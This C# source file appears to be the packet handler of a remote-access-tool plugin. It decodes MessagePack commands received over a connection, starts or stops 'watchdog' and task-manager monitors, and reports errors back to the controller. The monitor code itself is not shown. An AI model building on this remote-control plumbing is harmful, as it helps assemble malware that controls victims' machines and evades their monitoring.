using Plugin.Handle;
using System;

namespace Plugin
{
    public static class Packet
    {
        public static void Read(object data)
        {
            try
            {
                MessagePackLib.MessagePack.MsgPack unpack_msgpack = new MessagePackLib.MessagePack.MsgPack();
                unpack_msgpack.DecodeFromBytes((byte[])data);
                switch (unpack_msgpack.ForcePathObject("Pac_ket").AsString)
                {
                    case "WatchDogStart":
                        {
                            new HandleDogs().WatchDogStart();
                            break;
                        }
                    case "WatchDogStop":
                        {
                            new HandleDogs().WatchDogStop();
                            break;
                        }
                    case "TaskMgrStart":
                        {
                            new HandleDogs().TaskMgrDogStart();
                            break;
                        }
                    case "TaskMgrStop":
                        {
                            new HandleDogs().TaskMgrDogStop();
                            break;
                        }

                }
            }
            catch (Exception ex)
            {
                Error(ex.Message);
            }
        }
        public static void Error(string ex)
        {
            MessagePackLib.MessagePack.MsgPack msgpack = new MessagePackLib.MessagePack.MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Error";
            msgpack.ForcePathObject("Error").AsString = ex;
            Connection.Send(msgpack.Encode2Bytes());
        }


    }

}